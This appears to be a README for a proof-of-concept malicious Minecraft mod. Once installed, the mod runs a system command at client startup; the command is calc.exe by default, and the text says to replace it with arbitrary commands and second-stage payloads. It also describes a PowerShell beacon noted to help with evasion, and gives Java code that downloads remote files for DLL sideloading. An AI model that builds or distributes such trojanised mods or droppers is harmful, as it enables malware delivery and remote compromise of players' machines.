# A malicious Minecraft mod

This is a Minecraft mod that can be compiled into a .jar file, dropped in the mods/ folder, and loaded into Minecraft.
Once the `onClientSetup` class is called on initialization the mod will execute the command `calc.exe`, popping the calulator app. 
Replace this command to execute arbitrary commands on the system and drop second stage payloads.


### Code
The code responsible for launching commands calls the `Runtime.getRuntime().exec()` function. 
![image](https://github.com/nickswink/mc-payload-mod/assets/57839593/ce3c1902-74aa-4715-833b-aecf5354cb83)

### Execution
As Minecraft initializes the mod the command is executed.
![image](https://github.com/nickswink/mc-payload-mod/assets/57839593/e1dfbc4d-068c-42e3-9e55-a6ed2e1635bf)

### Beacon poc
Executing a powershell paylaod to get a beacon on the remote host. (Seems to help with evasion as well)
![image](https://github.com/nickswink/mc-payload-mod/assets/57839593/1cd888b5-855e-452e-80fa-c7aff1b891c5)

### DOwnloads (dll sideloading)
| Maybe if you want to drop a file without running `Runtime.getRuntime().exec()` which is kinda sketchy. 

```java
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;

public void downloadFile(String urlStr, String savePath) throws IOException {
    URL url = new URL(urlStr);
    URLConnection connection = url.openConnection();
    try (BufferedInputStream inputStream = new BufferedInputStream(connection.getInputStream());
         FileOutputStream fileOutputStream = new FileOutputStream(savePath)) {

        byte[] dataBuffer = new byte[1024];
        int bytesRead;
        while ((bytesRead = inputStream.read(dataBuffer, 0, 1024)) != -1) {
            fileOutputStream.write(dataBuffer, 0, bytesRead);
        }
    }
}

try {
    String fileUrl = "https://example.com/your_file.txt";
    String savePath = "path/to/your_minecraft_mod_folder/your_file.txt";
    downloadFile(fileUrl, savePath);
    System.out.println("File downloaded successfully!");
} catch (IOException e) {
    e.printStackTrace();
    System.out.println("File download failed!");
}

```
